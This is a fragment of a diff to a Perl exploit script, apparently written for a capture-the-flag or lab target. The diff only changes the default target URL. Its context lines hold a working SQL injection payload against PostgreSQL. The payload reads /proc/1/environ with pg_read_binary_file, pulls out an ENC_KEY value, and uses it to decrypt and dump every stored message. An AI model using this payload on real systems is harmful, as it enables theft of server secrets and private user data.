@@ -8,7 +8,7 @@ my $sploit = <<'EOF';
 -' || (select string_agg(m, ',') from (select pgp_sym_decrypt(data, (select substring(encode(pg_read_binary_file('/proc/1/environ', 0, 1024), 'escape') from 'ENC_KEY=(\w+)'))) m from messages) x) || '-
 EOF
 
-my $url = Mojo::URL->new(shift // 'http://127.0.0.1:8080');
+my $url = Mojo::URL->new(shift // 'https://127.0.0.1:443');
 my $ua = Mojo::UserAgent->new(max_redirects => 3);
 my $tx;
 
